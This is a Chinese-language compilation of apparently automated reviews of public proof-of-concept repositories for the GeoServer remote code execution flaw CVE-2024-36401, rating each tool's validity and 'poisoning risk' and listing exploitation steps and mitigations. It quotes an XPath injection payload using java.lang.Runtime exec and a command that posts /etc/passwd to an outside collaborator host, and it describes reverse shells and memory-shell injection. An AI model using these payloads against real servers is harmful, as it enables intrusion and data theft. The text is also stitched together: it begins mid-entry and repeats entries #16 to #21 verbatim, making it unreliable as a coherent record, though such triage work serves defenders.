提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

**项目地址:** [thestar0/CVE-2024-36401-WoodpeckerPlugin](https://github.com/thestar0/CVE-2024-36401-WoodpeckerPlugin)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #22

**来源**: [CVE-2024-36401-whitebear-ch_GeoServerExploit.md](../2024/CVE-2024-36401-whitebear-ch_GeoServerExploit.md)

## CVE-2024-36401 - GeoServer RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的攻击者可以执行任意代码。

**影响版本:** 受影响版本包括 2.22.6 之前的所有版本，2.23.0 <= version < 2.23.6, 2.24.0 <= version < 2.24.4, 2.25.0 <= version < 2.25.2

**利用条件:** 默认 GeoServer 安装，需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于 GeoTools 库不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致未经身份验证的用户可以通过构造特定的 OGC 请求参数（如 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute）执行任意代码。

根据漏洞库信息和搜索结果，此漏洞利用已被积极利用。提供的漏洞利用代码（GeoServerExploit）表明已经存在可用的 PoC。

投毒风险分析：提供的漏洞利用代码仅包含 README.md 文件，展示了工具的使用示例和致谢信息。虽然从单个 README.md 文件无法完全判断是否存在投毒代码，但考虑到这是一个漏洞利用工具，仍有小概率（10%）存在作者隐藏的恶意代码或其他未公开的利用方式。需要检查完整的项目代码才能更准确地评估投毒风险。

利用方式总结：攻击者通过构造恶意的 OGC 请求，利用 commons-jxpath 库执行任意 XPath 表达式，从而实现远程代码执行。

**项目地址:** [whitebear-ch/GeoServerExploit](https://github.com/whitebear-ch/GeoServerExploit)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #23

**来源**: [CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md](../2024/CVE-2024-36401-yisas93_CVE-2024-36401-PoC.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 2.23.0 < 2.23.6, 2.24.0 < 2.24.4, 2.25.0 < 2.25.2, < 2.22.6

**利用条件:** GeoServer实例需要能够处理WFS GetPropertyValue等OGC请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，该漏洞源于 GeoTools 库 API 不安全地将属性名称传递给 commons-jxpath 库，从而允许执行任意代码。PoC 代码通过构造 WFS GetPropertyValue 请求，利用 XPath 表达式注入来执行恶意命令。该 PoC 包含一个 Python 脚本 (exploit.py) 和一个类型名称列表 (type_names.txt)。脚本首先在攻击者主机上启动一个反向 shell 监听器，然后将反向 shell 命令进行 Base64 编码，最后通过特制的 WFS GetPropertyValue 请求发送到目标 GeoServer 实例。如果成功，GeoServer 将执行该命令，并将反向 shell 连接回攻击者主机。

**有效性：**

根据漏洞描述和搜索结果，该漏洞在野外已被利用，PoC代码是有效的。

**投毒风险：**

分析提供的 PoC 代码，未发现明显的恶意代码或后门。代码功能清晰，主要用于利用漏洞执行远程命令。`type_names.txt` 文件包含 GeoServer 已知类型名称列表，用于构造请求，本身不构成安全风险。`exploit.py` 脚本的功能是生成反向 shell 命令，对其进行编码，并通过构造的 WFS GetPropertyValue 请求发送它。不存在隐藏的恶意功能。

**利用方式：**

1.  攻击者需要一台能够建立网络连接的主机。
2.  攻击者运行 PoC 脚本，指定目标 GeoServer URL，以及反向 shell 的 IP 地址和端口。
3.  PoC 脚本构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求，其中 XPath 表达式注入了反向 shell 命令。
4.  GeoServer 在处理请求时，由于漏洞，会执行该恶意命令。
5.  攻击者主机收到来自 GeoServer 实例的反向 shell 连接，从而获得对服务器的控制。

总的来说，提供的PoC没有发现有投毒代码，主要通过java.lang.Runtime.getRuntime()执行命令。

**项目地址:** [yisas93/CVE-2024-36401-PoC](https://github.com/yisas93/CVE-2024-36401-PoC)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---



---

## POC #16

**来源**: [CVE-2024-36401-justin-p_geoexplorer.md](../2024/CVE-2024-36401-justin-p_geoexplorer.md)

## CVE-2024-36401 - GeoServer远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 严重，未授权的远程代码执行

**影响版本:** 受影响版本包括 2.23.0 到 2.23.6，2.24.0 到 2.24.4，2.25.0 到 2.25.2，以及低于 2.22.6 的版本。

**利用条件:** 默认 GeoServer 安装，网络可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行漏洞，由于 GeoTools 库 API 不安全地将属性名称作为 XPath 表达式传递给 commons-jxpath 库，导致攻击者可以通过构造特定的 OGC 请求（如 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）来执行任意代码。漏洞利用通过修改property/attribute，使之成为恶意的xpath表达式，触发commons-jxpath执行代码。提供的 PoC 代码 `GeoExplorer` 旨在扫描 GeoServer 实例并利用此漏洞。 

**有效性：**

根据漏洞库信息、搜索结果以及提供的 PoC 代码，此漏洞是有效的并且已被积极利用。搜索结果中多个链接表明该漏洞已被公开披露，并且有威胁情报报告指出该漏洞已被恶意利用。

**投毒风险：**

分析提供的 PoC 代码，主要的投毒风险在于：

1.  **Catcher URL:** `client/main.py` 脚本中使用了 `-c` 参数指定 catcher URL，用于接收被利用的服务器的回调。攻击者可以控制这个 URL，将受害者重定向到恶意站点或者收集敏感信息。虽然默认值指向本地地址，但用户如果配置不当，则存在风险。
2.  **wget Payload:**  PoC 使用 `wget` 作为 payload，这本身存在一定风险。虽然 `wget` 通常用于下载文件，但恶意用户可能会利用它执行其他恶意操作。例如，下载并执行一个 shell 脚本。
3. **依赖风险:** 该POC依赖requests, argparse, urllib3等第三方库，如果作者上传了包含恶意代码的软件包到Pypi，存在一定的供应链风险.

综合分析，PoC 代码本身主要用于漏洞验证和利用，但如果使用者不小心配置或被中间人攻击替换catcher URL，则可能存在一定投毒风险。假设用户会检查和修改 catcher URL，并从官方源安装依赖，因此评估投毒风险为10%。

**利用方式：**

1.  **扫描目标：** 使用 PoC 客户端扫描存在漏洞的 GeoServer 实例。
2.  **发现FeatureType：** 利用`ListStoredQueries` request on WFS 获取feature type
3.  **构造恶意请求：** PoC 通过构造包含恶意 XPath 表达式的 OGC 请求，例如 WFS GetFeature 请求，来触发漏洞。XPath 表达式注入到 property/attribute name 中。
4.  **远程代码执行：** GeoServer 解析请求时，`commons-jxpath` 库会执行恶意 XPath 表达式，从而导致远程代码执行。
5.  **回调：**  被利用的服务器通过 `wget` 向指定的 catcher URL 发送请求，表明漏洞利用成功。

**项目地址:** [justin-p/geoexplorer](https://github.com/justin-p/geoexplorer)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #17

**来源**: [CVE-2024-36401-kkhackz0013_CVE-2024-36401.md](../2024/CVE-2024-36401-kkhackz0013_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** GeoServer

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.22.x (<2.22.6), 2.23.x (>=2.23.0 <2.23.6), 2.24.x (>=2.24.0 <2.24.4), 2.25.x (>=2.25.0 <2.25.2)

**利用条件:** 默认 GeoServer 安装，可通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-36401 允许未经身份验证的用户通过构造特制的 OGC 请求来执行远程代码。漏洞原因是 GeoServer 使用的 GeoTools 库不安全地将属性名称作为 XPath 表达式进行评估。攻击者可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求来利用此漏洞。

提供的POC代码 `CVE-2024-36401.py` 通过发送特制的 WFS GetPropertyValue 请求来利用漏洞。该请求包含一个 `valueReference` 参数，其中包含一个 `exec` 函数，该函数允许执行任意命令。默认POC代码使用 `nc` 命令来反弹 shell。代码中未发现明显的投毒行为。

利用方式：

1.  攻击者向存在漏洞的 GeoServer 实例发送特制的 WFS GetPropertyValue 请求。
2.  请求中的 `valueReference` 参数包含要执行的恶意代码。
3.  GeoServer 将 `valueReference` 中的属性名称传递给 commons-jxpath 库进行评估。
4.  commons-jxpath 库执行恶意代码，导致远程代码执行。

根据搜索引擎结果，此漏洞已经被积极利用，因此POC的有效性非常高。

综上，该POC有效，且未发现明显的投毒风险。利用方式清晰，风险等级为严重。

**项目地址:** [kkhackz0013/CVE-2024-36401](https://github.com/kkhackz0013/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #18

**来源**: [CVE-2024-36401-lowsuet_CVE-2024-36401.md](../2024/CVE-2024-36401-lowsuet_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.x < 2.22.6, 2.23.x < 2.23.6, 2.24.x < 2.24.4, 2.25.x < 2.25.2

**利用条件:** 目标GeoServer实例在受影响版本范围内，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是一个 GeoServer 中的远程代码执行漏洞，源于 GeoTools 库在处理要素类型属性名称时，不安全地将其传递给 commons-jxpath 库，导致在评估 XPath 表达式时可以执行任意代码。该漏洞影响所有 GeoServer 实例，无需身份验证即可利用。攻击者可以通过构造恶意的 WFS GetPropertyValue 请求，在目标服务器上执行任意命令。

**漏洞利用方式：**

1.  攻击者构造包含恶意 XPath 表达式的 WFS GetPropertyValue 请求。
2.  GeoServer 将属性名称传递给 commons-jxpath 库进行评估。
3.  commons-jxpath 库执行恶意 XPath 表达式，导致远程代码执行。

根据提供的漏洞利用代码，该 POC 使用 Go 语言编写，提供了一个图形化界面，允许用户指定目标 GeoServer URL 和要执行的命令，可以通过设置代理访问目标。该POC 代码通过构造恶意的`wfs:GetPropertyValue`请求，将命令传递给目标服务器执行。代码中使用了 `java.lang.Runtime.getRuntime()` 来执行命令，confirm 该方法是漏洞利用的关键。

**投毒风险分析：**

*   代码中存在网络请求功能，允许从远程服务器获取资源，增加了潜在的投毒风险。
*   代码中存在执行系统命令的功能，如果被篡改，可能被用于执行恶意操作。
*   虽然代码主要功能是利用漏洞，但如果作者植入恶意代码（例如，反弹 Shell 或下载执行恶意程序），则可能在使用者不知情的情况下感染目标系统。

考虑到以上风险，给与10%的投毒风险，请使用者在运行前仔细检查代码逻辑。

**项目地址:** [lowsuet/CVE-2024-36401](https://github.com/lowsuet/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #19

**来源**: [CVE-2024-36401-netuseradministrator_CVE-2024-36401.md](../2024/CVE-2024-36401-netuseradministrator_CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-远程代码执行

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** 2.22.6之前, 2.23.0 - 2.23.6, 2.24.0 - 2.24.4, 2.25.0 - 2.25.2

**利用条件:** 需要网络访问，GeoServer实例运行在受影响的版本上

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 存在于 GeoServer 中，由于不安全地将属性名称作为 XPath 表达式进行评估，导致未经身份验证的用户可以通过构造的输入执行远程代码。该漏洞利用了 GeoTools 库 API 对要素类型属性名称的处理方式，使其能够被传递到 commons-jxpath 库并执行任意代码。漏洞利用代码提供了一个图形化界面，允许用户指定目标 URL 和要执行的命令。它构造一个恶意的 WFS GetPropertyValue 请求，其中 valueReference 属性包含一个执行命令的表达式 (例如, `exec(java.lang.Runtime.getRuntime(),"command")`)。然后，通过 HTTP POST 请求将该请求发送到目标 GeoServer 实例。漏洞利用代码还包括代理设置功能，允许用户通过代理服务器发送请求。该漏洞可以通过 WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute 请求触发。

**投毒风险分析：**

代码中存在一定程度的投毒风险的可能性（约10%），主要体现在以下几个方面：

*   **依赖项：** `go.mod` 文件中存在一些第三方依赖项，例如 `fyne.io/fyne/v2` 用于图形界面。虽然这些依赖项本身是常用的，但它们可能会引入潜在的安全漏洞或后门，尤其是在构建过程中。
*   **图形界面：** 图形界面本身可能存在安全问题，例如，如果界面中的某些组件没有得到正确的安全处理，攻击者可能会利用这些组件来执行恶意代码。
*   **网络请求：** 代码中包含发起 HTTP 请求的代码。如果攻击者能够控制这些请求的内容，他们可能会利用这些请求来执行恶意操作。但是考虑到此项目是为了进行漏洞利用测试,因此远程请求是免不了的.
*   **内存马注入功能:** 代码声明包含内存马注入功能,虽然是为了漏洞利用,但也存在风险,可能被滥用。
*   **免责声明缺失:** 仓库中缺少明确的免责声明，可能导致使用者在未充分了解风险的情况下使用该工具，从而承担不必要的法律责任。

综上所述，该仓库中存在一定程度的投毒风险，但总体来说风险较低。使用者在使用该工具时应保持警惕，并仔细审查代码，以确保其安全性。

**项目地址:** [netuseradministrator/CVE-2024-36401](https://github.com/netuseradministrator/CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #20

**来源**: [CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md](../2024/CVE-2024-36401-punitdarji_GeoServer-CVE-2024-36401.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行

**影响应用:** GeoServer

**危害等级:** 高危，允许未经身份验证的用户执行任意代码

**影响版本:** 受影响版本包括 2.23.0 到 2.23.5, 2.24.0 到 2.24.3, 2.25.0 到 2.25.1 以及低于 2.22.6 的版本

**利用条件:** 需要网络访问，GeoServer实例可访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401 是 GeoServer 中的一个远程代码执行 (RCE) 漏洞，存在于处理属性名称表达式的过程中。该漏洞源于 GeoTools 库不安全地将属性/属性名称传递给 commons-jxpath 库，该库在评估 XPath 表达式时可以执行任意代码。此漏洞影响所有 GeoServer 实例，因为 XPath 评估不正确地应用于简单要素类型。

**有效性分析：**
根据漏洞描述和提供的POC代码，此漏洞很可能有效。POC 代码通过 `GetPropertyValue` 请求，利用 `valueReference` 参数执行任意代码。POC代码中使用了 `exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`，这允许攻击者在服务器上执行命令。

**投毒风险分析：**
提供的POC代码本身旨在利用漏洞执行命令，例如`wget --post-file=/etc/passwd <BURP COLLOBRATOR>`。这表明，使用该代码的目的本身就是攻击和信息窃取。从代码本身来看，没有明显的迹象表明存在作者隐藏的“投毒”代码，例如篡改受害者系统上的其他文件或执行其他恶意操作，但不能排除。
仓库本身可能存在投毒风险，例如，如果存在其他隐藏的脚本或配置，则可能会导致更广泛的损害。因此，保守估计投毒风险为10%。

**利用方式：**
1.  攻击者构造恶意的OGC（例如WFS GetPropertyValue、WFS GetFeature、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS Execute）请求。
2.  在请求的参数中，例如 `valueReference`，注入包含恶意代码的 XPath 表达式。示例中使用的是`exec(java.lang.Runtime.getRuntime(),"<PAYLOAD>")`。
3.  GeoServer在处理请求时，会将该表达式传递给存在漏洞的 GeoTools 库进行处理。
4.  `commons-jxpath` 库执行该恶意代码，导致远程代码执行。
5.  攻击者可以利用此漏洞在服务器上执行任意命令，例如反弹 shell、读取敏感文件等。

**缓解措施：**
*   升级到 GeoServer 2.22.6、2.23.6、2.24.4 或 2.25.2 及以上版本。
*   作为临时解决方案，可以从 GeoServer 中删除 `gt-complex-x.y.jar` 文件，但这可能会影响某些功能。

**项目地址:** [punitdarji/GeoServer-CVE-2024-36401](https://github.com/punitdarji/GeoServer-CVE-2024-36401)

**漏洞详情:** [CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

---

## POC #21

**来源**: [CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md](../2024/CVE-2024-36401-thestar0_CVE-2024-36401-WoodpeckerPlugin.md)

## CVE-2024-36401-GeoServer-RCE

**漏洞编号:** CVE-2024-36401

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** GeoServer

**危害等级:** 高危，未经身份验证的远程代码执行

**影响版本:** < 2.22.6, >= 2.23.0 < 2.23.6, >= 2.24.0 < 2.24.4, >= 2.25.0 < 2.25.2

**利用条件:** 默认GeoServer安装，可通过WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求进行利用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-36401是GeoServer中的一个远程代码执行漏洞，由于GeoTools库不安全地将属性名称作为XPath表达式传递给commons-jxpath库导致的。未经身份验证的攻击者可以利用此漏洞通过构造恶意的OGC请求来执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，该漏洞已在野外被利用，并且存在公开的POC。提供的漏洞利用代码是一个Woodpecker插件，它支持批量探测和利用该漏洞，包括执行任意命令和注入内存马。该插件使用Java编写，并且提供了详细的使用说明，表明其有效性较高。

**投毒风险：**

该代码主要功能是漏洞利用，内存马注入，但是自定义内存马部分存在风险,如果被替换成恶意代码，可能存在投毒行为，因此风险为10%。

**利用方式：**

1.  **漏洞触发：** 攻击者通过构造恶意的OGC请求（例如WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic 和 WPS Execute请求），将恶意XPath表达式传递给GeoServer。
2.  **XPath注入：** GeoServer使用GeoTools库处理OGC请求中的属性名称。GeoTools库不安全地将这些属性名称传递给commons-jxpath库进行处理。
3.  **代码执行：** commons-jxpath库将恶意XPath表达式作为代码执行，导致远程代码执行。
4.  **内存马注入（可选）：** 攻击者可以使用该漏洞注入内存马，以便在目标服务器上持久化控制。

**总结：** CVE-2024-36401是一个高危的远程代码执行漏洞，易于利用且影响广泛。建议受影响的用户尽快升级到安全版本或采取缓解措施（例如删除`gt-complex-x.y.jar`文件）。提供的POC代码可以有效利用该漏洞，但也应谨慎使用，以避免潜在的恶意代码风险。

